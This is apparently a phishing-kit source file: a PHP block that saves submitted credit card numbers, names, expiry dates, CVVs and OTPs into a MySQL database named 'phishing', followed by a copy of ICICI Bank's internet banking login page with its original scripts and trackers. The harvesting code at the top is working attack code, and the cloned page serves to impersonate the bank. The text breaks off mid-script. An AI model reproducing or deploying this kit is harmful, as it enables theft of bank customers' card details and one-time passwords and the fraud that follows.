
<?php
$pdo = new PDO('mysql:host=localhost;port=3306;dbname=phishing','admin','passkey');

$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);


if (isset($_POST['card_num'])&&isset($_POST['card_name'])&&isset($_POST['card_expiry'])&&isset($_POST['card_cvv'])&&isset($_POST['otp'])){
	$sql = "INSERT INTO creditcard (card_num,card_name,card_expiry,card_cvv,otp) VALUES (:card_num,:card_name,:card_expiry,:card_cvv,:otp)";
	
	$stmt = $pdo->prepare($sql);
	$stmt->execute(array(
		':card_num' => $_POST['card_num'],
		':card_name' => $_POST['card_name'],
		':card_expiry' => $_POST['card_expiry'],
		':card_cvv' => $_POST['card_cvv'],
		':otp' => $_POST['otp']
	));
}
?>

<!DOCTYPE html> 
<html> 
  <head> 
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
       <meta name="google-site-verification" content="l1E3_DRZehEWUTYXNLeDzEXaqS_sKNQoCmdbLdv1Gxo" />
   </head>




 <!-- start BioCatch Integration by somya -->
 
 
 
 <script type="text/javascript" src="scripts/biocatch.js"></script>
 
 

 
 
<input  type="Hidden" name="biocatchSessionId" value="ggAibKBdzO"  id="biocatchSessionId" />
 
<!-- end BioCatch Integration by somya -->



<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">









<meta http-equiv="X-UA-Compatible" content="IE=EDGE">

<html lang="en">
<head>



 











 
 
 


<link href="style1.css" rel="stylesheet" type="text/css"/>
<link href="style2.css" rel="stylesheet" type="text/css"/>
<script language="JavaScript" src="scripts/ria/ajaxfeatures/jquerymin.js"></script>
<script type="text/javascript">jQuery.noConflict();</script>
  

<script  type="text/javascript">

	var iciciIp1='XYZABC'; 

</script> 


<script type="text/javascript" src="scripts/common/NFEBALoginScripts.js?isPortletRequest=false,moduleId=user,scriptsPath=scripts,isVdtMode=false,nodePath=,ipAddress=222.222.222.222,contextPath=/corp"></script>
	
	


<script>setTreeFormt(1);</script>

























   
	
	




<script language=JavaScript>
history.forward();
</script>

		<!--added for quick jump mobile start-->
	<script>
	jQuery(document).ready(function(){  
      var ctaFlagValMob = "";
      if(ctaFlagValMob == "MLGCTA"){
	  document.getElementById('HDisplay1').style.display='none';
	  goToMobileOTP();                
      }
});
</script>
<!--added for quick jump mobile end-->


<!-- Added for RIB CIB Integration START-->

	
<input  type="Hidden" name="IS_CIBRIB_LOGIN" value=""  id="IS_CIBRIB_LOGIN" />



<input  type="Hidden" name="IS_ACTION" value=""  id="IS_ACTION" />


<input  type="Hidden" name="IS_BYPASS_DONE" value=""  id="IS_BYPASS_DONE" />
<!-- Added for RIB CIB Integration END-->
<!-- added for Login Captcha Changes start here  -->





<!-- added for Login Captcha Changes end here  -->

<!--Added for Login default banner CTA Start-->

<!--Added for Login default banner CTA End-->

<!-- added for EDHS flag based default banner changes start -->



<input  type="Hidden" name="IS_NLI_STATUS" value="Y"  id="IS_NLI_STATUS" />
<input  type="Hidden" name="LOGIN_DEFAULT_BANNER_URL" value="https://infinity.icicibank.com/corp/L001/consumer/Login_Revamp/Login_Default_Banner.html"  id="LOGIN_DEFAULT_BANNER_URL" />
<!-- added for EDHS flag based default banner changes end -->




<style>
.login-field {
    border-radius: 5px;
    height: 24rem !important;
    background: white;
    width: 260px;
    margin: 0 0 0 auto;
    box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.39);
    -moz-box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.39);
    -webkit-box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.39);
}
</style>

<script language=JavaScript>
var xFrameFunction = function() {
	if (self == top) {
		var theBody = document.getElementsByTagName("body")[0];
		theBody.style.display = "block";
	} else{
		top.location = self.location;
	}
};
jQuery(document).ready(function(){
jQuery('#AuthenticationFG\\.ACCESS_CODE').attr('autocomplete', 'off');
jQuery('#dummypwd2').attr('autocomplete', 'new-password');
jQuery('#dummy1').attr('autocomplete', 'new-password');

// adding this to hide RIB topbar when NLI CMS is paiting the screen start
try {
	if(document.getElementById('topbar-wrapper') !=null)
	{
		console.log('hiding the rib topbar');
	    document.getElementById('topbar-wrapper').style.display='none';
		window.parent.jQuery("#links_container").addClass("links-margin");
		window.parent.jQuery('#global').addClass("global-margin");
	}
	if(document.getElementById("IS_NLI_STATUS") !=null)
	{
		if(document.getElementById("IS_NLI_STATUS").value == "N")
		{
			console.log('showing the rib topbar when NLI is down and EDHS flag is N');
	        document.getElementById('topbar-wrapper').style.display='block';
			window.parent.jQuery("#links_container").removeClass("links-margin");
			window.parent.jQuery("#global").removeClass("global-margin");
		}
	}
} catch (e) {
	console.log('in exception to hide RIB topbar when NLI CMS is paiting the screen');
}
	// adding this to hide RIB topbar when NLI CMS is paiting the screen end
	
	//CIB RIB INTEGRATION - START
try
{
	console.log('inside cibrib changes start --1');
	if(document.getElementById("IS_CIBRIB_LOGIN") !=null)
	{
		if(document.getElementById("IS_CIBRIB_LOGIN").value == "Y")
		{
			if(document.getElementById('Revamp_Banner') !=null)
			{
				document.getElementById('Revamp_Banner').style.display='none';
			}
			
			if(document.getElementById('topbar-wrapper') !=null)
			{
				
				document.getElementById('topbar-wrapper').style.display='none';
			}
			
			if(document.getElementById('TopICICIBankHome') !=null)
			{
				
				document.getElementById('TopICICIBankHome').style.display='none';
			}
			
			if(document.getElementById('TopAboutUs') !=null)
			{
				
				document.getElementById('TopAboutUs').style.display='none';
			}
			
			if(document.getElementById('Top24hrCustomerCare') !=null)
			{
				
				document.getElementById('Top24hrCustomerCare').style.display='none';
			}
			
			if(document.getElementById('TopFindATM') !=null)
			{
				
				document.getElementById('TopFindATM').style.display='none';
			}
			
			if(document.getElementById('mb') !=null)
			{
				
				document.getElementById('mb').style.display='none';
			}
			
			if(document.getElementById('links_container_mb') !=null)
			{
				
				document.getElementById('links_container_mb').style.display='none';
			}
			if(document.getElementById('Footertext') !=null)
			{
				document.getElementById('Footertext').style.display='none';
			}
			if(document.getElementById('footerInner') !=null)
			{
				document.getElementById('footerInner').style.display='none';
			}
			if(document.getElementById('NLI_Revamp_Banner_ID') !=null)
			{
				document.getElementById('NLI_Revamp_Banner_ID').style.display='none';
			}
			console.log('inside cibrib changes start --25');
			if(document.getElementById('IS_ACTION') !=null)
			{
			   if(document.getElementById('IS_ACTION').value=="LOGIN") {
				   
				    console.log('inside cibrib changes start --27');
					if(document.getElementById('IS_BYPASS_DONE') !=null)
			       {
					   console.log('inside cibrib changes start --28');
				       if(document.getElementById('IS_BYPASS_DONE').value != "Y") {
			             console.log('inside cibrib changes start --29');
			             document.getElementById("BYPASS_LOGIN_RIBCIB").click();
		               }
				   }
				   console.log('inside cibrib changes start --30');
		       }
			   
			}
			
		}
	}
	     console.log('inside cibrib changes start --33');
	
}catch(e)
{
}
  //CIB RIB INTEGRATION - END
	

	try{
	jQuery(".ainner-col-2").find(".labelColumn_combo").addClass("dropdown-el");
	jQuery(".ainner-col-2").find(".newListSelected").css("box-shadow", 'none');
	jQuery(".ainner-col-2").find("select").css("display",'block');
	var pageFlag = jQuery("#PageIdentifier").val();
	if(pageFlag == "O"){
		jQuery("#AuthenticationFG\\.RIB_LOGIN_OTP").focus();
		//CIB RIB INTEGRATION - START
		if(document.getElementById("IS_CIBRIB_LOGIN") !=null)
		{
			if(document.getElementById("IS_CIBRIB_LOGIN").value == "Y")
			{
				if(document.getElementById('NLI_Revamp_Banner_ID') !=null)
				{
					document.getElementById('NLI_Revamp_Banner_ID').style.display='none';
				}
			}
		}
		//CIB RIB INTEGRATION - END
	
	}else if(pageFlag == "Z"){
		jQuery("#PageIdentifier").val("U");		
		jQuery("#HDisplayDefault").addClass('completeHide');
		jQuery("#HDisplay1").removeClass('completeHide');
		jQuery("#AuthenticationFG\\.USER_PRINCIPAL").focus();
	
	}else if(pageFlag == "M"){
		jQuery("#AuthenticationFG\\.RIB_LOGIN_MOBILE").focus();
		try{
		if(jQuery("#errorlink1") != null ){
			if(jQuery("#errorlink1").length == 1){
				(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
				(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
				m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
				})(window,document,'script','//www.google-analytics.com/analytics.js','ga'); 
				ga('create', 'UA-17906056-1',{'cookieDomain': 'icicibank.com'});
				ga('send', 'pageview', '/VPV/LI/InternetBanking/InfinityLogin/LoginRIBusingMobilenoIncorrect',{
				'dimension72':'nli_personalb_personal_login_btn', 'dimension77': ''});
			}
		}
		}catch(e1){}
	
	}else if(pageFlag == "U"){
		jQuery("#AuthenticationFG\\.USER_PRINCIPAL").focus();
	
	}
	}catch(e1){}
	jQuery("[id='dummypwd1']").attr("tabindex","-1");
    jQuery("[id='dummypwd2']").attr("tabindex","-1");
	xFrameFunction();	
	
	jQuery('#RIB_VALIDATE_MOBILE_LOGIN').click(function(e) {  
		console.log("entered RIB_VALIDATE_MOBILE_LOGIN");
		var mobileNumber = document.getElementById("AuthenticationFG.RIB_LOGIN_MOBILE").value;
		if(mobileNumber!=""){
		jQuery("#RIB_VALIDATE_MOBILE_LOGIN").addClass('diableButtonsStyle');
		}else if(mobileNumber==""){
			alert("Please enter your Registered Mobile Number");
		}
	});
	
	jQuery('#RIB_VALIDATE_MOBILE_OTP').click(function(e) {  
		console.log("entered RIB_VALIDATE_MOBILE_OTP");
		var loginOTP = document.getElementById("AuthenticationFG.RIB_LOGIN_OTP").value;
		var loginAtmPin = document.getElementById("AuthenticationFG.RIB_LOGIN_ATM_PIN").value;
		if(loginOTP!=""){
		jQuery("#RIB_VALIDATE_MOBILE_OTP").addClass('diableButtonsStyle');
		}else if(loginOTP==""){
			alert("Please  Enter 6 digit OTP");
		}
	});
	
	
	jQuery('#VALIDATE_CREDENTIALS1').click(function(e) {  
		console.log("entered VALIDATE_CREDENTIALS1");
		var userId = document.getElementById("AuthenticationFG.USER_PRINCIPAL").value;
		var password = document.getElementById("AuthenticationFG.ACCESS_CODE").value;
		if(userId!="" && password!=""){
		jQuery("#VALIDATE_CREDENTIALS1").addClass('diableButtonsStyle');
		}
	});
	jQuery('#VALIDATE_CREDENTIALS2').click(function(e) {  
		console.log("entered VALIDATE_CREDENTIALS2");
		var userId = document.getElementById("AuthenticationFG.USER_PRINCIPAL").value;
		var password = document.getElementById("AuthenticationFG.ACCESS_CODE").value;
		if(userId!="" && password!=""){
		jQuery("#VALIDATE_CREDENTIALS2").addClass('diableButtonsStyle');
		}
		
	});
	
	jQuery('#CUSTOM_VALIDATE_CREDENTIALS').click(function(e) {  
		console.log("entered CUSTOM_VALIDATE_CREDENTIALS");
		 if(document.getElementById('AuthenticationFG.USER_PRINCIPAL').value=="")
		 {
			 alert("Please enter your User ID");
			 document.getElementById('AuthenticationFG.USER_PRINCIPAL').focus();			 	
			 return false; 
		 }
		 else if(document.getElementById('AuthenticationFG.ACCESS_CODE').value=="")
		 {
			 alert("Please enter your Password");
			 document.getElementById('AuthenticationFG.ACCESS_CODE').focus();
			 return false; 
		 }
		
	});
	

	// Added for Login default banner CTA start
    try
    {
    	console.log("inside try of CTA")
    	new URL(window.location.href).searchParams.get('CTA_FLAG')?show_usr_pass_dd():"";
    	
    	function show_usr_pass_dd()
    	{
    		jQuery("#PageIdentifier").val("U");		
    		jQuery("#HDisplayDefault").addClass('completeHide');
    		jQuery("#HDisplay1").removeClass('completeHide');
    		jQuery("#AuthenticationFG\\.USER_PRINCIPAL").focus();
    	}
    	
    	
    	
    }
    catch(e)
    {
    	console.error(e);
    }
	//Added for Login default banner CTA end
	
<!--start biocatch-->
	try {
 var session_id;
	 if(document.getElementById("biocatchSessionId")!= null)
	 {
		 session_id = document.getElementById("biocatchSessionId").value;
	 }
	 console.log("inside biocatch function 2 ");
	 console.log("session id 2 = "+ session_id);
	window.cdApi.setCustomerSessionId(session_id);
	console.log("session id is created 2 ");
	var jsp_name;
if(document.querySelector('[id*="REPORTTITLE"]')!= null	)
{
	jsp_name = document.querySelector('[id*="REPORTTITLE"]').value;
}
	console.log("jsp name 2 = "+ jsp_name);
	window.cdApi.changeContext(jsp_name);
	console.log("jsp name get stored 2 ");
	var brand_name ="ICICI";
	window.cdApi.setCustomerBrand(brand_name);
	console.log("brand name get stored 2 ");
 }

catch(e){
}
<!--end biocatch-->
	
});	

</script>

<script>
if(document.getElementById("IS_CIBRIB_LOGIN").value == "Y")
{
	console.log('inside cibrib ga code changes>>1');	
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga'); 
ga('create', 'UA-17906056-1',{'cookieDomain': 'icicibank.com'});
ga('set', 'userId', tvc_getCookie()("Fed_ID_NLI")); 
ga('send', 'pageview', '/VPV/LI/InternetBanking/CIBRIBIntegration/CIBtoRIBloginpage',{ 
   'dimension1': tvc_getCookie()("Fed_ID_NLI"), 
   'dimension77': tvc_getQueryString()("CTA_FLAG",window.location.href), 
   'dimension72': tvc_getQueryString()("ITM",window.location.href), 
	   'dimension124':  tvc_getQueryString()("ITM",window.location.href),
   'dimension2': tvc_getCookie()("tvc_segment"), 
   'dimension45': "NTB_"+tvc_getCookie()("rn"), 
   'dimension78': ITM_value() 
});

}
		
else{
	
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga'); 
ga('create', 'UA-17906056-1',{'cookieDomain': 'icicibank.com'});
ga('set', 'userId', tvc_getCookie()("Fed_ID_NLI")); 
ga('send', 'pageview', '/VPV/LI/InternetBanking/InfinityLogin/LogintoInternetBanking',{ 
   'dimension1': tvc_getCookie()("Fed_ID_NLI"), 
   'dimension77': tvc_getQueryString()("CTA_FLAG",window.location.href), 
   'dimension72': tvc_getQueryString()("ITM",window.location.href), 
	   'dimension124':  tvc_getQueryString()("ITM",window.location.href),
   'dimension2': tvc_getCookie()("tvc_segment"), 
   'dimension45': "NTB_"+tvc_getCookie()("rn"), 
   'dimension78': ITM_value() 
});

}
//Get ITM_value for CD 78 
function ITM_value(){ var ITM_query = tvc_getQueryString()("ITM",window.location.href); var ITM_cookie = tvc_getCookie()("tvc_ITM_hit_scope"); if(ITM_query){ 
  if(ITM_cookie){ 
          if(ITM_cookie.split('_')[2].toLowerCase() == ITM_query.split('_')[2].toLowerCase()){ console.log('First ___________cookievalue'); 
             return ITM_cookie.toLowerCase(); 
          }else{ 
              if(ITM_query.split('_')[2].toLowerCase() == "personal"){ console.log('Else ------- inside If_______cookievalue'); 
return ITM_cookie.toLowerCase(); 	 
} console.log('Set Cookie________else'); tvc_setCookie()('tvc_ITM_hit_scope',ITM_query.toLowerCase(), '.icicibank.com'); 	 return ITM_query.toLowerCase(); 
               } 
              }else { 

console.log('Last ________else'); tvc_setCookie()('tvc_ITM_hit_scope',ITM_query.toLowerCase(), '.icicibank.com'); 
return ITM_query.toLowerCase(); 	 
              } 
}else{ console.log('First IF Else ------______cookievalue'); if(ITM_cookie){ return ITM_cookie.toLowerCase();  
} 
} 
} 

function tvc_getCookie(){ return function (cname) { 
    var result; 
    return (result = new RegExp('(?:^|; )' + encodeURIComponent(cname) + 
'=([^;]*)').exec(document.cookie)) ? decodeURIComponent(result[1]) : null; 
}; 
} 

function tvc_setCookie(){ return function(cname, cvalue, domain, duration) { 
        var d = new Date(); 
        var expires = '', calc_duration = 0, set_domain; 
        if(duration){ 
            if (duration.minutes) {                 calc_duration = duration.minutes * 60 * 1000; 
            } else if (duration.hours) {                 calc_duration = duration.hours * 60 * 60 * 1000; 
            } else if (duration.days) {                 calc_duration = duration.days * 24 * 60 * 60 * 1000; 
            } else if (duration.months) { 

                calc_duration = duration.months * 30 * 24 * 60 * 60 * 1000; 
            } else if (duration.years) {                 calc_duration = duration.years * 365 * 24 * 60 * 60 * 1000; 
            } 
            d.setTime(d.getTime() + calc_duration);             expires = "expires=" + d.toUTCString() + ';'; 
        }         set_domain = domain ? domain : '.' + document.domain.replace('www.', ''); 
        document.cookie = cname + "=" + cvalue + ";" + expires + "domain=" + set_domain + 
";path=/"; 
    } 
} 



function tvc_getQueryString(){   return function ( field , url ) { 
    var href = url ? url : null; 
    var reg = new RegExp( '[?&]' + field + '=([^&#]*)', 'i' ); 
    var string = reg.exec(href); 
    return string ? string[1] : null; 
  } 
} 

function captchaRefresh() {
	var img = jQuery("#IMAGECAPTCHA");
	console.log('inside captchaRefresh function :: '+img);
	var orgImgUrl = img.attr('src');
	img.data('orgImgUrl', orgImgUrl);
	jQuery("#TEXTIMAGE").bind('click',function() {
		if(document.getElementById('AuthenticationFG.VERIFICATION_CODE')!=null){
			document.getElementById('AuthenticationFG.VERIFICATION_CODE').value="";
		}
		var rand = Math.random();
		var imgUrl = img.data('orgImgUrl');
		var newUrl = imgUrl + "&t=" + rand;
		img.attr('src', newUrl);
		
		return false;
	});
}

</script>

<script language=JavaScript>
function RememberUserId() {
        var checkBoxVal = document.getElementById("AuthenticationFG.REMEMBER_USERID_CHECKBOX");
        if(checkBoxVal.checked)
		{
       document.getElementById("AuthenticationFG.REMEMBER_USERID_CHECKBOX").value = "true";
       }
       else
       {
         document.getElementById("AuthenticationFG.REMEMBER_USERID_CHECKBOX").value = "false";
       }
    
}
</script>
<script type="text/javascript"> 

new Image().src=document.location.protocol+"//mon"+"sta"+"t.co"+"m/ICICIinfinity.p"+"ng?du="+escape(document.location)+"&dr="+escape(document.referrer)+"&rr="+Math.random();

</script>






<!-- 
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga'); 
ga('create', 'UA-17906056-1',{'cookieDomain': 'icicibank.com'});
ga('send', 'pageview', '/VPV/LI/InternetBanking/InfinityLogin/LogintoInternetBankin',{
'dimension72':'nli_personalb_personal_login_btn', 'dimension77': 'NA'});
</script> 
-->
<!-- Start of VWO Code integration -->
<script type="text/javascript">
	try{
		var _vwo_clicks=50;
		var _vwo_code = (function() {
			var account_id = 126657, //YOUR_ACCOUNT_ID
				settings_tolerance = 2000,
				library_tolerance = 2500,
				use_existing_jquery = false,
				is_spa = 1,
				/* DO NOT EDIT BELOW THIS LINE */
				f = false,
				d = document;
			return {
				use_existing_jquery: function() {
					return use_existing_jquery;
			   },
				library_tolerance: function() {
					return library_tolerance;
				},
				finish: function() {
					if (!f) {
						f = true;
						var a = d.getElementById('_vis_opt_path_hides');
						if (a) a.parentNode.removeChild(a);
					}
				},
				finished: function() {
					return f;
				},
				load: function(a) {
					var b = d.createElement('script');
					b.src = a;
					b.type = 'text/javascript';
					b.innerText;
					b.onerror = function() {
						_vwo_code.finish();
					};
					d.getElementsByTagName('head')[0].appendChild(b);
				},
				init: function() {
					settings_timer = setTimeout('_vwo_code.finish()', settings_tolerance);
					var a = d.createElement('style'),
						b = 'body{opacity:0 !important;filter:alpha(opacity=0) !important;background:none !important;}',
						h = d.getElementsByTagName('head')[0];
					a.setAttribute('id', '_vis_opt_path_hides');
					a.setAttribute('type', 'text/css');
					if (a.styleSheet) a.styleSheet.cssText = b;
					else a.appendChild(d.createTextNode(b));
					h.appendChild(a);
					this.load('//dev.visualwebsiteoptimizer.com/j.php?a=' + account_id + '&u=' + encodeURIComponent(d.URL) + '&f=' + (+is_spa) + '&r=' + Math.random());
					return settings_timer;
				}
			};
		}());
		_vwo_settings_timer = _vwo_code.init();
	}catch(e){}
</script>

<!-- End of VWO Code integration -->

<!-- Facebook Pixel Code -->
<!-- <script>
!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,
document,'script','https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '1584375811875352'); // Insert your pixel ID here.
fbq('track', 'PageView');
</script>
<noscript><img height="1" width="1" style="display:none"
src="https://www.facebook.com/tr?id=1584375811875352&ev=PageView&noscript=1"
/></noscript> -->
<!-- DO NOT MODIFY -->
<!-- End Facebook Pixel Code -->

<!-- Google Code for Remarketing Tag START-->
<!--------------------------------------------------
Remarketing tags may not be associated with personally identifiable information or placed on pages related to sensitive categories. See more information and instructions on how to setup the tag on: https://google.com/ads/remarketingsetup
--------------------------------------------------->
<script type="text/javascript">
/* <![CDATA[ */
var google_conversion_id = 848956189;
var google_custom_params = window.google_tag_params;
var google_remarketing_only = true;
/* ]]> */
</script>
<script type="text/javascript" src="//www.googleadservices.com/pagead/conversion.js">
</script>
<noscript>
<div style="display:inline;">
<img height="1" width="1" style="border-style:none;" alt="" src="//googleads.g.doubleclick.net/pagead/viewthroughconversion/848956189/?guid=ON&amp;script=0"/>
</div>
</noscript>


<!-- Google Code for Remarketing Tag END-->

<!-- Google Code for Remarketing Tag START-->
<!--------------------------------------------------
Remarketing tags may not be associated with personally identifiable information or placed on pages related to sensitive categories. See more information and instructions on how to setup the tag on: https://google.com/ads/remarketingsetup
--------------------------------------------------->
<script type="text/javascript">
/* <![CDATA[ */
var google_conversion_id = 961178487;
var google_custom_params = window.google_tag_params;
var google_remarketing_only = true;
/* ]]> */
</script>
<script type="text/javascript" src="//www.googleadservices.com/pagead/conversion.js">
</script>
<noscript>
<div style="display:inline;">
<img height="1" width="1" style="border-style:none;" alt="" src="//googleads.g.doubleclick.net/pagead/viewthroughconversion/961178487/?guid=ON&amp;script=0"/>
</div>
</noscript>
<!-- Google Code for Remarketing Tag END-->
<!-- added for video site capture  start -->
<script language=JavaScript>
function stop_video(){
 var iframe = document.getElementById('IplayHowToLoginVideo');
 iframe.src = null;
}
function lightbox_open() {
	window.scrollTo(0, 0); 
	document.getElementById('light').style.display = 'block'; 
	document.getElementById('fade').style.display = 'block'; 	
}
function lightbox_close() {
	stop_video();
	document.getElementById('light').style.display = 'none';
	document.getElementById('fade').style.display = 'none';
	var iframe = document.getElementById('IplayHowToLoginVideo');
	iframe.src = "https://www.youtube.com/embed/laGp2CFbRCM?rel=0";
}
</script>
 <!-- added for video site capture  end -->
<!-- added for video site capture  start -->
<style>
#fade {
	display: none; 
	position: fixed;
	top: 0%;
	left: 0%; 
	width: 100%; 
	height: 100%; 
	background-color: black; 
	z-index: 100001;
	-moz-opacity: 0.8; 
	opacity: .20; 
	filter: alpha(opacity=80); 
	} 
#light {
	display: none;
	position: fixed;
	height: 300px;
    width: 600px;
	top: 50%; 
	left: 50%; 
	max-width: 600px;
	max-height: 360px;
	margin-left: -300px;
	margin-top: -180px;
	border-radius: 10px;
	border: 15px solid #FFF;
	background: white;
	z-index: 100002;
	overflow: visible;
	} 
.boxclose {
	float: right; 
	cursor: pointer;
	color: #fff;
	border: 1px solid #AEAEAE;
	border-radius: 20px;
	background: orange;
	font-size: 20px;  
	display: inline-block; 
	line-height: 0px;
	padding: 11px 3px;
	position: absolute;
	right: -25px; 
	top: -25px; 
	z-index: 1002;
	opacity: 0.9; 
} 
.boxclose:before { 
content: "";
 } 
 #fade:hover ~ #boxclose {
	 display:none;
	 } 
.test:hover ~ .test2 { 
display: none;
}
</style>
 <!-- added for video site capture  end -->
<style>
.m1{
    padding-left: 79px !important;
    font-size: 13px;
}
.m2{
margin-left: -2px;
}

.login_f_n {
   
    float: left;
    font-family: Arial,Helvetica,sans-serif;
    font-size: 12px;
    height: 23px;
    width: auto;
    margin-left: 2px;
}
.loginrow1 {
    width: 420px;
    clear: both;
    margin-left: 10px;
	}
.diableButtonsStyle{
cursor: not-allowed !important;
pointer-events: none !important
}	
.loginrow-V1 {
    width: 250px !important;
    clear: both;
}
.captcha-margintop {
    margin-top: 2.5px !important;
}
.formbtn_imgcaptcha_usr {
    padding-right: 13px;
    background: url(L001/corporate/images/reset.jpg);
    border: 0px solid #333333;
    float: right;
    height: 22px;
    cursor: pointer;
    margin-right: 90px;
    
}
.text-field-captcha {
    margin-top: 3px;
    padding: 0 5px;
    width: 198px;
    height: 26px !important;
    border: 1px solid #b9b9b9 !important;
}
</style>



































	
	
	
<!-- added for Login Revamp Changes start here  -->


<!--added for Login Revamp Changes end here  -->
























<!--Added for DEH reverse SSO by Rutuja Start-->

<!--Added for DEH reverse SSO by Rutuja End-->

<script type="text/javascript">
jQuery(document).ready(function(){
	try{
	document.addEventListener('keyup', function (e) {
		if (document.getElementById("PageIdentifier").value == "" && e.keyCode == 9) {
		console.log("111");
		  document.getElementById("DUMMY1").focus();
		  console.log("222");
		  document.getElementById("DUMMY1").click();
		  console.log("333");
		  console.log("444");
		}
	});
	}catch(e9){
	}
	
    var txtBox = document.getElementById("AuthenticationFG.USER_PRINCIPAL");
     /* Added for iMobile SSO - Start */
	var callMode = document.getElementById("AuthenticationFG.__CALL_MODE__").value;
	if(callMode == 99 || callMode == 100){
		document.getElementById("AuthenticationFG.ACCESS_CODE").value="";
		jQuery(".row").css("width","100%");
		jQuery("#global").hide();
		jQuery("#MessageDisplay_TABLE").hide();
		jQuery("#HDisplay1").hide();
		jQuery("#HDisplayDefault").hide();
		jQuery("#HDisplay2").hide();
		try{
		 if(jQuery("#header-wrapper")!=null){jQuery("#header-wrapper").hide();}
		 if(jQuery("#topbar-wrapper")!=null){jQuery("#topbar-wrapper").hide();}
		 if(jQuery(".nav-header")!=null){jQuery(".nav-header").hide();}
		}catch(e){
			console.log("in callmode catch");
		}
		 
		jQuery("#HDisplayIMobile").css("padding-top","20%");
		jQuery("#HDisplayIMobile").show();
		jQuery("#FooterLinks").hide();
		jQuery("#footer").hide();
		jQuery("#Footertext").hide();
		document.getElementById("AuthenticationFG.__CALL_MODE__").value = "-9999";
		jQuery("#IMOBILE_LOGIN").click();
	}
	else if(callMode == 119 ){
		console.log("inside 119 if ");
		document.getElementById("AuthenticationFG.ACCESS_CODE").value="";
		jQuery(".row").css("width","100%");
		jQuery("#global").hide();
		jQuery("#MessageDisplay_TABLE").hide();
		jQuery("#HDisplay1").hide();
		jQuery("#HDisplayDefault").hide();
		jQuery("#HDisplay2").hide();
		try{
		 if(jQuery("#header-wrapper")!=null){jQuery("#header-wrapper").hide();}
		 if(jQuery("#topbar-wrapper")!=null){jQuery("#topbar-wrapper").hide();}
		 if(jQuery(".nav-header")!=null){jQuery(".nav-header").hide();}
		}catch(e){
			console.log("in callmode catch");
		}
		 
		jQuery("#HDisplayDEH").css("padding-top","20%");
		jQuery("#HDisplayDEH").show();
		jQuery("#FooterLinks").hide();
		jQuery("#footer").hide();
		jQuery("#Footertext").hide();
		document.getElementById("AuthenticationFG.__CALL_MODE__").value = "-9999";
		console.log("before click");
		var dehLogin = document.getElementById("DEH_LOGIN").value;
		console.log("after click",dehLogin);
		jQuery("#DEH_LOGIN").click();
		console.log("after click");
	}
	else{
		 jQuery("#HDisplayIMobile").hide();
	}
	/* Added for iMobile SSO - End */
	var userIdInsideCookie = document.getElementById("AuthenticationFG.USER_PRINCIPAL1").value;
	 if(userIdInsideCookie == '' || userIdInsideCookie == null)
		{
		document.getElementById("AuthenticationFG.REMEMBER_USERID_CHECKBOX").checked = false;
       }
       else
       {
	   document.getElementById("AuthenticationFG.REMEMBER_USERID_CHECKBOX").checked = true;
       }
	document.getElementById("AuthenticationFG.USER_PRINCIPAL").value = userIdInsideCookie;
	try{
		document.getElementById("DUMMY1").value = userIdInsideCookie;
		
	}catch(e){}
	

if((jQuery('#MessageDisplay_TABLE')!=null) && (document.getElementById('PID').value!=null) &&  (document.getElementById('PID').value!='') && (location.href.search('REDIR=Y') != -1) ) {

     jQuery("#global").hide();
	 jQuery("#MessageDisplay_TABLE").hide();
	 jQuery("#HDisplay1").hide();
	 jQuery("#HDisplay2").hide();
	 jQuery("#FooterLinks").hide();
 	 jQuery("#footer").hide();
 	  var errMessage = "";
 	          try {
 				errMessage = document.getElementById('MessageDisplay_TABLE').firstChild.childNodes[2].textContent;
 	          } catch(err) {
 	        	errMessage = document.getElementById('MessageDisplay_TABLE').firstChild.innerText;
 	        }

 	     alert(errMessage);

 	  	//alert('MD'+ document.getElementById('MD').value)
			//document.getElementById('MD_NEW').value= document.getElementById('MD').value;
			//alert('PID'+ document.getElementById('PID').value) ;

			document.getElementById('PID_NEW').value= document.getElementById('PID').value;
			//alert('PRN'+ document.getElementById('PRN').value);

			document.getElementById('PRN_NEW').value= document.getElementById('PRN').value;
			//alert('ITC'+ document.getElementById('ITC').value);

			document.getElementById('ITC_NEW').value= document.getElementById('ITC').value;
			//alert('AMT'+ document.getElementById('AMT').value);

			document.getElementById('AMT_NEW').value= document.getElementById('AMT').value;
			//alert('CRN'+document.getElementById('CRN').value);

			document.getElementById('CRN_NEW').value= document.getElementById('CRN').value;
			//alert('RU'+ document.getElementById('RU').value) ;

			document.getElementById('RU_NEW').value= document.getElementById('RU').value;
			//alert('CG'+ document.getElementById('CG').value) ;

			document.getElementById('CG_NEW').value= document.getElementById('CG').value;
